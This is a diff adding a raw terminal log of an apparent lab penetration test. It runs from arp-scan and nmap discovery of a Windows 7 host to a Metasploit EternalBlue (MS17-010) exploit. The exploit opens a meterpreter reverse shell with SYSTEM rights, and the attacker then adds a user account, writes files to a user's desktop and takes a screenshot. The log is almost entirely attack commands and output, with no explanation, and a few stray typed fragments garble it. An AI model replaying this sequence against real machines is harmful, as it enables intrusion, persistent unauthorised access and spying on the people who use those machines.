@@ -1,0 +1,595 @@
+                                                         
+┌──(kali㉿kali)-[~]
+└─$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.0.82  netmask 255.255.255.0  broadcast 10.0.0.255
+        inet6 fe80::d4b6:ab2d:7cdb:7678  prefixlen 64  scopeid 0x20<link>
+        inet6 2001:1308:2039:bf00:5c28:30f:eb5a:cdf6  prefixlen 64  scopeid 0x0<global>
+        ether 08:00:27:1f:b7:23  txqueuelen 1000  (Ethernet)
+        RX packets 26595  bytes 28758616 (27.4 MiB)
+        RX errors 5839  dropped 0  overruns 0  frame 5839
+        TX packets 13579  bytes 1012616 (988.8 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 8  bytes 480 (480.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8  bytes 480 (480.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+s
+┌──(kali㉿kali)-[~]
+└─$ sudo arp-scan -I eth0 --localnet
+[sudo] password for kali: 
+Interface: eth0, type: EN10MB, MAC: 08:00:27:1f:b7:23, IPv4: 10.0.0.82
+WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
+WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+10.0.0.1        a4:16:e7:78:b1:a3       (Unknown)
+10.0.0.27       b4:86:55:fd:d7:69       (Unknown)
+10.0.0.30       68:d7:9a:8c:4f:10       (Unknown)
+10.0.0.39       90:61:ae:c3:45:dd       (Unknown)
+sudo
+10.0.0.51       ac:0b:fb:d6:a5:6b       (Unknown)
+10.0.0.42       80:0c:67:e6:7f:fd       (Unknown)
+10.0.0.67       9c:a3:a9:9a:bc:09       (Unknown)
+10.0.0.24       1c:cc:d6:0f:45:c4       (Unknown)
+10.0.0.38       1c:4d:70:4e:1e:98       (Unknown)
+10.0.0.54       9a:8d:fa:9a:55:e9       (Unknown: locally administered)
+10.0.0.65       a0:af:bd:3f:fa:66       (Unknown)
+10.0.0.91       3a:e1:26:ed:99:9b       (Unknown: locally administered)
+10.0.0.84       a0:af:bd:3f:fa:66       (Unknown)
+10.0.0.110      f4:96:34:b9:6d:51       (Unknown)
+10.0.0.108      f6:09:41:70:c9:d2       (Unknown: locally administered)
+10.0.0.121      10:02:b5:23:04:38       (Unknown)
+10.0.0.129      f4:96:34:b9:6d:51       (Unknown)
+10.0.0.140      1c:4d:70:4e:1e:98       (Unknown)
+10.0.0.149      90:61:ae:c3:45:dd       (Unknown)
+10.0.0.174      9c:a3:aa:4f:bf:b0       (Unknown)
+10.0.0.139      4c:34:88:09:63:11       (Unknown)
+10.0.0.137      48:45:20:47:a0:cc       (Unknown)
+10.0.0.185      fc:ec:da:94:9a:ff       (Unknown)
+10.0.0.169      a0:af:bd:3f:fa:66       (Unknown)
+10.0.0.218      60:f6:77:ac:22:8b       (Unknown)
+10.0.0.225      64:c6:d2:c2:19:62       (Unknown)
+10.0.0.224      ee:8e:4c:3a:35:4b       (Unknown: locally administered)
+10.0.0.239      b0:35:9f:9e:98:00       (Unknown)
+
+29 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.991 seconds (128.58 hosts/sec). 28 responded
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sn 10.0.0.82/24                          
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 12:26 EST
+Nmap scan report for dev.opt (10.0.0.1)
+Host is up (0.0049s latency).
+MAC Address: A4:16:E7:78:B1:A3 (Huawei Technologies)
+Nmap scan report for 10.0.0.24
+Host is up (0.043s latency).
+MAC Address: 1C:CC:D6:0F:45:C4 (Xiaomi Communications)
+Nmap scan report for 10.0.0.30
+Host is up (0.0053s latency).
+MAC Address: 68:D7:9A:8C:4F:10 (Ubiquiti)
+Nmap scan report for 10.0.0.38
+Host is up (0.0083s latency).
+MAC Address: 1C:4D:70:4E:1E:98 (Intel Corporate)
+Nmap scan report for 10.0.0.39
+Host is up (0.0071s latency).
+MAC Address: 90:61:AE:C3:45:DD (Intel Corporate)
+Nmap scan report for 10.0.0.42
+Host is up (0.039s latency).
+MAC Address: 80:0C:67:E6:7F:FD (Apple)
+Nmap scan report for 10.0.0.51
+Host is up (0.054s latency).
+MAC Address: AC:0B:FB:D6:A5:6B (Espressif)
+Nmap scan report for 10.0.0.54
+Host is up (0.0091s latency).
+MAC Address: 9A:8D:FA:9A:55:E9 (Unknown)
+Nmap scan report for 10.0.0.65
+Host is up (0.15s latency).
+MAC Address: A0:AF:BD:3F:FA:66 (Intel Corporate)
+Nmap scan report for 10.0.0.67
+Host is up (0.0057s latency).
+MAC Address: 9C:A3:A9:9A:BC:09 (Guangzhou Juan Optical and Electronical Tech Joint Stock)
+Nmap scan report for 10.0.0.84
+Host is up (0.12s latency).
+MAC Address: A0:AF:BD:3F:FA:66 (Intel Corporate)
+Nmap scan report for 10.0.0.91
+Host is up (0.090s latency).
+MAC Address: 3A:E1:26:ED:99:9B (Unknown)
+Nmap scan report for 10.0.0.110
+Host is up (0.0071s latency).
+MAC Address: F4:96:34:B9:6D:51 (Intel Corporate)
+Nmap scan report for 10.0.0.121
+Host is up (0.034s latency).
+MAC Address: 10:02:B5:23:04:38 (Intel Corporate)
+Nmap scan report for 10.0.0.129
+Host is up (0.060s latency).
+MAC Address: F4:96:34:B9:6D:51 (Intel Corporate)
+Nmap scan report for 10.0.0.139
+Host is up (0.046s latency).
+MAC Address: 4C:34:88:09:63:11 (Intel Corporate)
+Nmap scan report for 10.0.0.140
+Host is up (0.044s latency).
+MAC Address: 1C:4D:70:4E:1E:98 (Intel Corporate)
+Nmap scan report for 10.0.0.149
+Host is up (0.0062s latency).
+MAC Address: 90:61:AE:C3:45:DD (Intel Corporate)
+Nmap scan report for 10.0.0.169
+Host is up (0.022s latency).
+MAC Address: A0:AF:BD:3F:FA:66 (Intel Corporate)
+Nmap scan report for 10.0.0.174
+Host is up (0.020s latency).
+MAC Address: 9C:A3:AA:4F:BF:B0 (Unknown)
+Nmap scan report for 10.0.0.185
+Host is up (0.013s latency).
+MAC Address: FC:EC:DA:94:9A:FF (Ubiquiti)
+Nmap scan report for 10.0.0.218
+Host is up (0.00047s latency).
+MAC Address: 60:F6:77:AC:22:8B (Intel Corporate)
+Nmap scan report for 10.0.0.224
+Host is up (0.0068s latency).
+MAC Address: EE:8E:4C:3A:35:4B (Unknown)
+Nmap scan report for 10.0.0.225
+Host is up (0.034s latency).
+MAC Address: 64:C6:D2:C2:19:62 (Seiko Epson)
+Nmap scan report for 10.0.0.239
+Host is up (0.012s latency).
+MAC Address: B0:35:9F:9E:98:00 (Intel Corporate)
+Nmap scan report for 10.0.0.82
+Host is up.
+Nmap done: 256 IP addresses (26 hosts up) scanned in 7.32 seconds
+           
+┌──(kali㉿kali)-[~]
+└─$ ping -c 1 10.0.0.84                               
+PING 10.0.0.84 (10.0.0.84) 56(84) bytes of data.
+64 bytes from 10.0.0.84: icmp_seq=1 ttl=128 time=180 ms
+
+--- 10.0.0.84 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 180.343/180.343/180.343/0.000 ms
+                                                                         
+                                                      
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -p 445,135,139 -sCV -vvv -min-rate 5000 10.0.0.84   
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 13:25 EST
+NSE: Loaded 157 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 13:25
+Completed NSE at 13:25, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 13:25
+Completed NSE at 13:25, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 13:25
+Completed NSE at 13:25, 0.00s elapsed
+Initiating ARP Ping Scan at 13:25
+Scanning 10.0.0.84 [1 port]
+Completed ARP Ping Scan at 13:25, 0.09s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 13:25
+Completed Parallel DNS resolution of 1 host. at 13:25, 2.51s elapsed
+DNS resolution of 1 IPs took 2.51s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 2, CN: 0]
+Initiating SYN Stealth Scan at 13:25
+Scanning 10.0.0.84 [3 ports]
+Discovered open port 135/tcp on 10.0.0.84
+Discovered open port 139/tcp on 10.0.0.84
+Discovered open port 445/tcp on 10.0.0.84
+Completed SYN Stealth Scan at 13:25, 0.03s elapsed (3 total ports)
+Initiating Service scan at 13:25
+Scanning 3 services on 10.0.0.84
+Completed Service scan at 13:26, 6.12s elapsed (3 services on 1 host)
+NSE: Script scanning 10.0.0.84.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 13:26
+Completed NSE at 13:26, 5.18s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 13:26
+Completed NSE at 13:26, 0.01s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 13:26
+Completed NSE at 13:26, 0.01s elapsed
+Nmap scan report for 10.0.0.84
+Host is up, received arp-response (0.011s latency).
+Scanned at 2026-01-30 13:25:54 EST for 12s
+
+PORT    STATE SERVICE      REASON          VERSION
+135/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
+139/tcp open  netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds syn-ack ttl 128 Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+MAC Address: A0:AF:BD:3F:FA:66 (Intel Corporate)
+Service Info: Host: MICROCHOFT; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -5h20m02s, deviation: 34m38s, median: -5h00m02s
+| smb-os-discovery: 
+|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1
+|   Computer name: Microchoft
+|   NetBIOS computer name: MICROCHOFT\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-01-30T14:25:59+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2:1:0: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-01-30T13:25:59
+|_  start_date: 2026-01-30T11:24:09
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 14677/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 5744/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 44405/udp): CLEAN (Timeout)
+|   Check 4 (port 10764/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| nbstat: NetBIOS name: MICROCHOFT, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:c8:ef:f2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+| Names:
+|   MICROCHOFT<20>       Flags: <unique><active>
+|   MICROCHOFT<00>       Flags: <unique><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   WORKGROUP<1e>        Flags: <group><active>
+|   WORKGROUP<1d>        Flags: <unique><active>
+|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
+| Statistics:
+|   08:00:27:c8:ef:f2:00:00:00:00:00:00:00:00:00:00:00
+|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 13:26
+Completed NSE at 13:26, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 13:26
+Completed NSE at 13:26, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 13:26
+Completed NSE at 13:26, 0.00s elapsed
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
+           Raw packets sent: 4 (160B) | Rcvd: 4 (160B)
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap --script "vuln and safe" -p 135,139,445 10.0.0.84
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 13:37 EST
+Nmap scan report for 10.0.0.84
+Host is up (0.020s latency).
+
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: A0:AF:BD:3F:FA:66 (Intel Corporate)
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap --script smb-vuln-ms17-010 10.0.0.84             
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 14:08 EST
+Nmap scan report for 10.0.0.84
+Host is up (0.018s latency).
+Not shown: 991 closed tcp ports (reset)
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+MAC Address: A0:AF:BD:3F:FA:66 (Intel Corporate)
+
+Host script results:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+Nmap done: 1 IP address (1 host up) scanned in 11.75 seconds
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ msfconsole -q             
+msf > search eternalblue
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+
+
+Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce                                      
+After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'                                                        
+
+msf > use 0
+[*] No payload configured, defaulting to Akwindows/x64/meterpreter/reverse_tcp
+msf exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https:
+                                             //docs.metasploit.com/docs/usi
+                                             ng-metasploit/basics/using-met
+                                             asploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain
+                                             to use for authentication. Onl
+                                             y affects Windows Server 2008
+                                             R2, Windows 7, Windows Embedde
+                                             d Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for th
+                                             e specified username
+   SMBUser                         no        (Optional) The username to aut
+                                             henticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture m
+                                             atches exploit Target. Only af
+                                             fects Windows Server 2008 R2,
+                                             Windows 7, Windows Embedded St
+                                             andard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exp
+                                             loit Target. Only affects Wind
+                                             ows Server 2008 R2, Windows 7,
+                                              Windows Embedded Standard 7 t
+                                             arget machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh,
+                                        thread, process, none)
+   LHOST     10.0.0.82        yes       The listen address (an interface ma
+                                        y be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.0.0.84
+RHOST => 10.0.0.84
+msf exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         10.0.0.84        yes       The target host(s), see https:
+                                             //docs.metasploit.com/docs/usi
+                                             ng-metasploit/basics/using-met
+                                             asploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain
+                                             to use for authentication. Onl
+                                             y affects Windows Server 2008
+                                             R2, Windows 7, Windows Embedde
+                                             d Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for th
+                                             e specified username
+   SMBUser                         no        (Optional) The username to aut
+                                             henticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture m
+                                             atches exploit Target. Only af
+                                             fects Windows Server 2008 R2,
+                                             Windows 7, Windows Embedded St
+                                             andard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exp
+                                             loit Target. Only affects Wind
+                                             ows Server 2008 R2, Windows 7,
+                                              Windows Embedded Standard 7 t
+                                             arget machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh,
+                                        thread, process, none)
+   LHOST     10.0.0.82        yes       The listen address (an interface ma
+                                        y be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(windows/smb/ms17_010_eternalblue) > check
+[*] 10.0.0.84:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.0.0.84:445         - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.23/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 10.0.0.84:445         - Scanned 1 of 1 hosts (100% complete)
+[+] 10.0.0.84:445 - The target is vulnerable.
+msf exploit(windows/smb/ms17_010_eternalblue) > exploit
+[*] Started reverse TCP handler on 10.0.0.82:4444 
+[*] 10.0.0.84:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 10.0.0.84:445         - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7601 Service Pack 1 x64 (64-bit)
+[*] 10.0.0.84:445         - Scanned 1 of 1 hosts (100% complete)
+[+] 10.0.0.84:445 - The target is vulnerable.
+[*] 10.0.0.84:445 - Connecting to target for exploitation.
+[+] 10.0.0.84:445 - Connection established for exploitation.
+[+] 10.0.0.84:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.0.0.84:445 - CORE raw buffer dump (40 bytes)
+[*] 10.0.0.84:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 42  Windows 7 Home B
+[*] 10.0.0.84:445 - 0x00000010  61 73 69 63 20 37 36 30 31 20 53 65 72 76 69 63  asic 7601 Servic
+[*] 10.0.0.84:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
+[+] 10.0.0.84:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.0.0.84:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.0.0.84:445 - Sending all but last fragment of exploit packet
+[*] 10.0.0.84:445 - Starting non-paged pool grooming
+[+] 10.0.0.84:445 - Sending SMBv2 buffers
+[+] 10.0.0.84:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.0.0.84:445 - Sending final SMBv2 buffers.
+[*] 10.0.0.84:445 - Sending last fragment of exploit packet!
+[*] 10.0.0.84:445 - Receiving response from exploit packet
+[+] 10.0.0.84:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.0.0.84:445 - Sending egg to corrupted connection.
+[*] 10.0.0.84:445 - Triggering free of corrupted buffer.
+[*] Sending stage (230982 bytes) to 10.0.0.84
+[*] Meterpreter session 1 opened (10.0.0.82:4444 -> 10.0.0.84:49159) at 2026-01-30 14:19:28 -0500
+[+] 10.0.0.84:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.0.0.84:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.0.0.84:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter > shell
+Process 1460 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami 
+whoami
+nt authority\system
+
+C:\Windows\system32>net user
+net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Admin                    Administrator            Guest                    
+Lola                     
+The command completed with one or more errors.
+
+
+C:\Windows\system32>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : 2001:1308:2039:bf00:64a7:d92c:ed9c:c68a
+   Temporary IPv6 Address. . . . . . : 2001:1308:2039:bf00:6598:2203:2eb9:8596
+   Link-local IPv6 Address . . . . . : fe80::64a7:d92c:ed9c:c68a%11
+   IPv4 Address. . . . . . . . . . . : 10.0.0.84
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::1%11
+                                       10.0.0.1
+
+Tunnel adapter isatap.{CED16EB6-104D-451B-A1CC-421E25E2AB17}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : ç
+
+
+C:\Windows\system32>net user Luis 1379 /add
+net user Luis 1379 /add
+The command completed successfully.
+
+C:\Users\Lola\Desktop>type nul > Luis.txt
+type nul > Luis.txt
+
+C:\Users\Lola\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 44E2-21EC
+
+ Directory of C:\Users\Lola\Desktop
+
+01/30/2026  03:31 PM    <DIR>          .
+01/30/2026  03:31 PM    <DIR>          ..
+01/30/2026  03:29 PM                 0 kevin.txt
+01/30/2026  03:31 PM                 0 Luis.txt
+03/28/2024  05:54 PM                32 user.txt
+               3 File(s)             32 bytes
+               2 Dir(s)  23,911,186,432 bytes free
+
+C:\Users\Lola\Desktop>exit
+exit
+meterpreter > screenshot
+Screenshot saved to: /home/kali/wzLqjVtR.jpeg
+meterpreter > Interrupt: use the 'exit' command to quit
+meterpreter > 
+
+
+                                                            
